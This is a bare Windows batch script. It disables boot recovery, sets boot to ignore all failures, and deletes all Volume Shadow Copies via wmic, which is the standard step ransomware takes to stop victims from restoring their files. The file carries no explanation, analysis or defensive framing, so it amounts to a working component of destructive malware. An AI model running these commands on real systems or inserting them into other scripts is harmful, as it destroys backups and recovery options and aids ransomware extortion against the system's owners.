@echo off
bcdedit /set {current} recoveryenabled No
bcdedit /set {current} bootstatuspolicy ignoreallfailures
wmic.exe shadowcopy delete
